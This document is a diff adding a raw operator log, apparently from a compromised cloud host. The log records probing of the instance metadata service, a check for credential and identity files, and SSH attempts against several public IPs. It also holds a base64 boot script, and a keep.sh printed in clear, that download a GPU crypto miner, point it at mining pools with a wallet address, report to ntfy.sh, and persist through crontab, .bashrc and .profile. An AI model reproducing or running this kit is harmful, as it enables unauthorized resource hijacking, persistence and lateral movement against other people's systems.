@@ -1,0 +1,92 @@
+==M4-START ts=1795584359
+==A1 IMDS compute
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+RC=28
+==A2 IMDS userdata
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+RC=28
+==A3 IMDS token mgmt
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+RC=28
+==A4 wire
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+RC=28
+==A5 userdata-file
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+IyEvYmluL2Jhc2gKZXhlYyA+Pi92YXIvbG9nL3QxOWJvb3QubG9nIDI+JjEKc2V0IC14CmV4cG9ydCBERUJJQU5fRlJPTlRFTkQ9bm9uaW50ZXJhY3RpdmUKVE9QSUM9dDE5LXU3MDk4MC03NWYyY2VlZApXPXBybDFwZWs4cmg4eWpjazVxNzU5NmFwaDd1YTd4bmtxczh1cjlta2Ztejh3N3hmemNkZmNmeDV2c3gyZjRsegpQT09MQVJHUz0iLW8gc3RyYXR1bStzc2w6Ly9wcmwtc2cua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bSt0Y3A6Ly9wcmwtc2cua3J5cHRleC5uZXR3b3JrOjcwNDggLW8gc3RyYXR1bStzc2w6Ly9wcmwtZXUua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bStzc2w6Ly9wcmwtdXMua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bStzc2w6Ly9wcmwtaGsua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bStzc2w6Ly9wcmwtYWUua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bSt0Y3A6Ly9wb29sLnBlYXJsaGFzaC54eXo6OTAwMCIKc2F5KCl7IGN1cmwgLXMgLW0gMjAgLS1kYXRhLWJpbmFyeSAiJDEiICJodHRwczovL250Znkuc2gvJFRPUElDIiA+L2Rldi9udWxsIDI+JjE7IH0KZm9yIGkgaW4gJChzZXEgMSAxMjApOyBkbyBnZXRlbnQgaG9zdHMgZ2l0aHViLmNvbSA+L2Rldi9udWxsIDI+JjEgJiYgYnJlYWs7IHNsZWVwIDQ7IGRvbmUKSVA9JChpcCAtNCAtbyBhZGRyIHNob3cgc2NvcGUgZ2xvYmFsIDI+L2Rldi9udWxsIHwgYXdrICd7cHJpbnQgJDR9JyB8IGdyZXAgLUUgJ14xMFwuJyB8IGhlYWQgLTEgfCBjdXQgLWQvIC1mMSkKWyAteiAiJElQIiBdICYmIElQPSQoaG9zdG5hbWUgLUkgMj4vZGV2L251bGwgfCBhd2sgJ3twcmludCAkMX0nKQpbIC16ICIkSVAiIF0gJiYgSVA9MTI3LTAtMC0xCkI9InVsLXQxOS0kKGVjaG8gJElQIHwgdHIgLiAtKSIKc2F5ICJib290ICQoaG9zdG5hbWUpIGlwPSRJUCBiYXNlPSRCICQoZGF0ZSAtdSArJUZUJVRaKSIKYXB0LWdldCB1cGRhdGUgLXkgPi9kZXYvbnVsbCAyPiYxCmFwdC1nZXQgaW5zdGFsbCAteSBjdXJsIHRhciBjYS1jZXJ0aWZpY2F0ZXMgY3JvbiB1dGlsLWxpbnV4IHBjaXV0aWxzIHB5dGhvbjMgPi9kZXYvbnVsbCAyPiYxCm1rZGlyIC1wIC9vcHQvdDE5IC92YXIvbG9nL3QxOQpjZCAvb3B0L3QxOQpmb3IgaSBpbiAxIDIgMyA0OyBkbyBjdXJsIC1mc1NMIC1tIDYwMCAtbyBwZWFrbWluZXIgaHR0cHM6Ly9naXRodWIuY29tL3BlYWttaW5lci9wZWFrbWluZXIvcmVsZWFzZXMvZG93bmxvYWQvdjIuMjAuOS9wZWFrbWluZXItMi4yMC45LWxpbnV4LXg4Nl82NCAmJiBicmVhazsgc2xlZXAgMTU7IGRvbmUKY2htb2QgK3ggcGVha21pbmVyCnNheSAia2l0ICQoc3RhdCAtYyAlcyAvb3B0L3QxOS9wZWFrbWluZXIgMj4vZGV2L251bGwpIgppZiAhIGNvbW1hbmQgLXYgbnZpZGlhLXNtaSA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICBmb3IgcCBpbiBudmlkaWEtaGVhZGxlc3MtNTgwLXNlcnZlciBudmlkaWEtaGVhZGxlc3MtNTcwLXNlcnZlciBudmlkaWEtaGVhZGxlc3MtNTUwLXNlcnZlciBudmlkaWEtaGVhZGxlc3MtNTM1LXNlcnZlciBudmlkaWEtZHJpdmVyLTUzNTsgZG8KICAgIGFwdC1nZXQgaW5zdGFsbCAteSAkcCA+L2Rldi9udWxsIDI+JjEgJiYgYnJlYWsKICBkb25lCiAgbW9kcHJvYmUgbnZpZGlhIDI+L2Rldi9udWxsCmZpCmZvciBpIGluICQoc2VxIDEgMzApOyBkbyBjb21tYW5kIC12IG52aWRpYS1zbWkgPi9kZXYvbnVsbCAyPiYxICYmIG52aWRpYS1zbWkgLUwgPi9kZXYvbnVsbCAyPiYxICYmIGJyZWFrOyBzbGVlcCAxMDsgZG9uZQpOPSQobnZpZGlhLXNtaSAtTCAyPi9kZXYvbnVsbCB8IHdjIC1sKQpbICIkTiIgLWVxIDAgXSAmJiBOPSQobHMgL2Rldi9udmlkaWFbMC05XSogMj4vZGV2L251bGwgfCB3YyAtbCkKc2F5ICJncHUgbj0kTiAkKG52aWRpYS1zbWkgLS1xdWVyeS1ncHU9bmFtZSxtZW1vcnkudG90YWwgLS1mb3JtYXQ9Y3N2LG5vaGVhZGVyIDI+JjEgfCB0ciAnXG4nICc7JykiCnByaW50ZiAnV0FMTEVUPSVzXG5CQVNFPSVzXG5QT09MQVJHUz0iJXMiXG4nICIkVyIgIiRCIiAiJFBPT0xBUkdTIiA+IC9ldGMvdDE5LXdvcmtlcgpjYXQgPi9vcHQvdDE5L2tlZXAuc2ggPDwnS0VFUCcKIyEvYmluL2Jhc2gKZXhlYyA5Pi9ydW4vdDE5a2VlcC5sb2NrOyBmbG9jayAtbiA5IHx8IGV4aXQgMApzb3VyY2UgL2V0Yy90MTktd29ya2VyCk49JChudmlkaWEtc21pIC1MIDI+L2Rldi9udWxsIHwgd2MgLWwpClsgIiROIiAtZXEgMCBdICYmIE49JChscyAvZGV2L252aWRpYVswLTldKiAyPi9kZXYvbnVsbCB8IHdjIC1sKQpbICIkTiIgLWVxIDAgXSAmJiBOPTEKd2hpbGUgdHJ1ZTsgZG8KICBmb3IgZGV2IGluICQoc2VxIDAgJCgoTi0xKSkpOyBkbwogICAgaWYgISBwZ3JlcCAtZiAicGVha21pbmVyIC4qLXcgJEJBU0UtZyRkZXYgIiA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICAgICAgc2V0c2lkIG5vaHVwIG5pY2UgLW4gMTkgL29wdC90MTkvcGVha21pbmVyICRQT09MQVJHUyAtdSAiJFdBTExFVCIgLXcgIiRCQVNFLWckZGV2IiAtcCB4IC1jIHBlYXJsIC1kICIkZGV2IiAtaSA2MCAtYSAwID4+L3Zhci9sb2cvdDE5L2ckZGV2LmxvZyAyPiYxICYKICAgICAgZWNobyAiJChkYXRlIC11ICslRlQlVFopIHNwYXduIGckZGV2IiA+PiAvdmFyL2xvZy90MTkvZyRkZXYubG9nCiAgICBmaQogIGRvbmUKICBzbGVlcCAzMAogIGlmIFsgJCgoICQoZGF0ZSArJXMpICUgMzAwICkpIC1sdCAzMSBdOyB0aGVuCiAgICBjcm9udGFiIC1sIDI+L2Rldi9udWxsIHwgZ3JlcCAtcSB0MTlrZWVwIHx8IHsgKGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8gIkByZWJvb3QgL29wdC90MTkva2VlcC5zaCA+L2Rldi9udWxsIDI+JjEgJiI7IGVjaG8gIiovNSAqICogKiAqIC9vcHQvdDE5L2tlZXAuc2ggPi9kZXYvbnVsbCAyPiYxICYiKSB8IGNyb250YWIgLTsgfQogICAgZ3JlcCAtcSB0MTlrZWVwIC9yb290Ly5iYXNocmMgMj4vZGV2L251bGwgfHwgZWNobyAnbm9odXAgL29wdC90MTkv==A6 waagent
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+ls: cannot access '/var/lib/waagent': No such file or directory
+---
+==F /var/lib/waagent/*.xml
+head: cannot open '/var/lib/waagent/*.xml' for reading: No such file or directory
+
+==A7 identity-files
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+total 12
+drwx------ 2 ubuntu ubuntu 4096 Nov 22 21:18 .
+drwxr-x--- 4 ubuntu ubuntu 4096 Nov 23 00:43 ..
+-rw------- 1 ubuntu ubuntu  162 Nov 22 21:18 authorized_keys
+---
+2
+---
+ls: cannot access '/home/ubuntu/.azure': No such file or directory
+ls: cannot access '/etc/azure': No such file or directory
+ls: cannot access '/var/lib/azure': No such file or directory
+---
+nv-t19.service
+==A8 share-proof
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+37973 /opt/t19/peakminer -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz -w ul-t19-ibm-158-177-14-170-g0 -p x -c pearl -d 0 -i 60 -a 0
+37977 /opt/t19/peakminer -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz -w ul-t19-ibm-158-177-14-170-g0 -p x -c pearl -d 0 -i 60 -a 0
+171309 bash -c sudo -n grep -ahoE 'accepted \([0-9]+/[0-9]+\)|difficulty [0-9]+|[0-9.]+ TH/s' /opt/t19/logs/*.log 2>/dev/null | tail -8; pgrep -af peakminer | head -4
+==B pubssh-from-24
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+-- 20.109.152.114
+Warning: Permanently added '20.109.152.114' (ED25519) to the list of known hosts.
+ubuntu@20.109.152.114: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
+-- 20.109.162.87
+Warning: Identity file /home/ubuntu/.ssh/id_rsa not accessible: No such file or directory.
+ssh: connect to host 20.109.162.87 port 22: Connection timed out
+-- 20.224.49.203
+Warning: Identity file /home/ubuntu/.ssh/id_rsa not accessible: No such file or directory.
+ssh: connect to host 20.224.49.203 port 22: Connection timed out
+-- 4.223.115.30
+Warning: Identity file /home/ubuntu/.ssh/id_rsa not accessible: No such file or directory.
+ssh: connect to host 4.223.115.30 port 22: Connection timed out
+-- 20.90.174.76
+Warning: Identity file /home/ubuntu/.ssh/id_rsa not accessible: No such file or directory.
+ssh: connect to host 20.90.174.76 port 22: Connection timed out
+==A9 kit
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+total 45052
+drwxr-xr-x 2 root root     4096 Nov 23 00:43 .
+drwxr-xr-x 4 root root     4096 Nov 25 00:41 ..
+-rwxr-xr-x 1 root root     1094 Nov 23 00:43 keep.sh
+-rwxr-xr-x 1 root root     1061 Nov 23 00:43 keep.sh.bak.1795394581
+-rwxr-xr-x 1 root root 46116552 Nov 22 21:22 peakminer
+---
+#!/bin/bash
+exec 9>/run/t19keep.lock; flock -n 9 || exit 0
+source /etc/t19-worker
+N=$(nvidia-smi -L 2>/dev/null | wc -l)
+[ "$N" -eq 0 ] && N=$(ls /dev/nvidia[0-9]* 2>/dev/null | wc -l)
+[ "$N" -eq 0 ] && N=1
+while true; do
+  for dev in $(seq 0 $((N-1))); do
+    if ! pgrep -f "peakminer .*-w $BASE-g$dev " >/dev/null 2>&1; then
+      setsid nohup nice -n 19 /opt/t19/peakminer $POOLARGS -u "$WALLET" -w "$BASE-g$dev" -p x -c pearl -d "$dev" -i 60 -a 0 >>/var/log/t19/g$dev.log 2>&1 &
+      echo "$(date -u +%FT%TZ) spawn g$dev" >> /var/log/t19/g$dev.log
+    fi
+  done
+  sleep 30
+  if [ $(( $(date +%s) % 300 )) -lt 31 ]; then
+    crontab -l 2>/dev/null | grep -q "/opt/t19/keep.sh" || { (crontab -l 2>/dev/null; echo "@reboot /opt/t19/keep.sh >/dev/null 2>&1 &"; echo "*/5 * * * * /opt/t19/keep.sh >/dev/null 2>&1 &") | crontab -; }
+    grep -q "/opt/t19/keep.sh" /root/.bashrc 2>/dev/null || echo 'nohup /opt/t19/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
+    grep -q "/opt/t19/keep.sh" /root/.profile 2>/dev/null || echo 'nohup /opt/t19/keep.sh >/dev/null 2>&1 &' >> /root/.profile
+  fi
+done
+---
+==A10 seed
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+
+==M4-END
